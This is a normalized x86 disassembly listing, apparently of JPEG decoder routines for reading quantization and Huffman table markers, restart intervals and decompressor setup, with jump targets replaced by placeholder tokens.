sub ecx [ ebp - 0x124 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x120 ]
and edx 0x10
test edx edx
je r-xdata
cmp [ ebp - 0x134 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x120 ]
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx * 4 + 0xa0 ]
mov [ ebp - 0x128 ] eax
mov eax [ ebp - 0x120 ]
sub eax 0x10
mov [ ebp - 0x120 ] eax
mov ecx [ ebp - 0x120 ]
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx * 4 + 0xb0 ]
mov [ ebp - 0x128 ] eax
jmp r-xdata
mov ecx [ ebp - 0x134 ]
sub ecx 0x1
mov [ ebp - 0x134 ] ecx
mov edx [ ebp - 0x11c ]
mov eax [ ebp - 0x130 ]
mov cl [ eax ]
mov [ ebp + edx - 0x118 ] cl
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x12c ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1e
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x120 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x120 ] 0x4
jl r-xdata
cmp [ ebp - 0x120 ] 0x0
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x12c ]
mov ecx [ eax ]
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x12c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x134 ] eax
xor al al
jmp r-xdata
push 0x11
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x128 ]
mov edx [ ecx ]
push edx
call memcpy
add esp 0xc
push 0x100
lea eax [ ebp - 0x118 ]
push eax
mov ecx [ ebp - 0x128 ]
mov edx [ ecx ]
add edx 0x11
push edx
call memcpy
add esp 0xc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_420c30
add esp 0x4
mov edx [ ebp - 0x128 ]
mov [ edx ] eax
mov eax [ ebp - 0x128 ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp - 0x11c ]
add edx 0x1
mov [ ebp - 0x11c ] edx
cmp [ ebp - 0x4 ] 0x10
jle r-xdata
sub_41d2a0
push ebp
mov ebp esp
sub esp 0x68
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x24 ]
sub eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ ecx ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x1c ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x24 ]
sub ecx 0x1
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x20 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x1c ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x24 ] edx
xor al al
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x2
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x24 ] eax
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
mov al 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xb
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov edx [ ebp - 0x24 ]
sub edx 0x1
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x20 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
xor eax eax
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x1c ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
sar ecx 0x4
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x8 ]
and edx 0xf
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x51
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x1c ] ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
cmp [ ebp - 0x8 ] 0x4
jl r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
xor al al
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x90 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x1f
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x90 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_420bf0
add esp 0x4
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x90 ] eax
cmp [ ebp - 0xc ] 0x40
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x68 ] 0x2
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x41
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x40
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0xc ] 0x40
jge r-xdata
mov edx [ ebp - 0x24 ]
sub edx 0x1
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x20 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
xor eax eax
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x1c ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x24 ]
sub ecx 0x1
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x20 ]
xor eax eax
mov al [ edx ]
shl eax 0x8
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x1c ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x18
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov ax [ edx + ecx * 2 ]
mov ecx [ ebp - 0x28 ]
mov [ ecx ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0x2 ]
mov edx [ ebp - 0x28 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dx [ ecx + eax * 2 + 0x4 ]
mov eax [ ebp - 0x28 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov ax [ edx + ecx * 2 + 0x6 ]
mov ecx [ ebp - 0x28 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dx [ ecx + eax * 2 + 0xa ]
mov eax [ ebp - 0x28 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov ax [ edx + ecx * 2 + 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ ecx + 0x18 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0xe ]
mov edx [ ebp - 0x28 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x5d
push 0x2
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
xor edx edx
test edx edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx * 4 + r--data ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp - 0x14 ]
mov [ eax + edx * 2 ] cx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
xor al al
jmp r-xdata
mov edx [ ebp - 0x24 ]
sub edx 0x1
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x20 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x14 ]
add edx ecx
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
xor ecx ecx
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x1c ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x24 ] eax
xor al al
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
xor al al
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x8
mov [ ebp - 0xc ] ecx
sub_41d720
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] edx
xor al al
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x4
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xb
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
shl edx 0x8
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x8 ]
add ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] edx
xor al al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x52
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x18 ] edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xfc ] ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov [ edx ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x4 ] edx
mov al 0x1
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
xor al al
jmp r-xdata
sub_41d920
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
xor ecx ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] edx
xor al al
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
xor eax eax
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0xc ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0xff
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
xor al al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x35
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x1c ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x8 ] 0xd8
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x17c ] ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov [ edx ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x4 ] edx
mov al 0x1
sub_41da60
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x17c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov ecx [ eax + 0x10 ]
add ecx 0xd0
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x17c ] ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41af90
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
call [ ecx + 0x14 ]
add esp 0x8
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x62
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ eax + 0x10 ]
mov [ edx + 0x18 ] eax
push 0x3
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x17c ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov ecx [ eax + 0x10 ]
add ecx 0x1
and ecx 0x7
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov [ eax + 0x10 ] ecx
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41db40
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x194 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x7c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x17c ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0xd ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa0 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dbb0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x3e
je r-xdata
cmp [ ebp + 0x10 ] 0x168
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x18 ] 0x3e
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x1c ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0xc ] eax
push 0x168
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call memset
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41f680
add esp 0x4
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x44 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x15
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x18 ] 0x168
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x1c ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x48 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x160 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x30 ] 0x0
mov [ edx + 0x34 ] 0x3ff00000
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x64
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x58 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x68 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
sub_41dd30
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ ecx + 0x80 ] dl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x58 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x68 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0xc ]
mov [ ecx + 0x111 ] dl
jmp r-xdata
mov eax [ ebp - 0xc ]
mov cl [ ebp + 0xc ]
mov [ eax + 0x111 ] cl
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_41dde0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x65
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0xd0 ]
cmp ecx [ eax + 0x20 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x66
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x13c ]
call [ eax + 0x8 ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x43
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x67
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x13c ]
xor ecx ecx
mov cl [ eax + 0xd ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14c ]
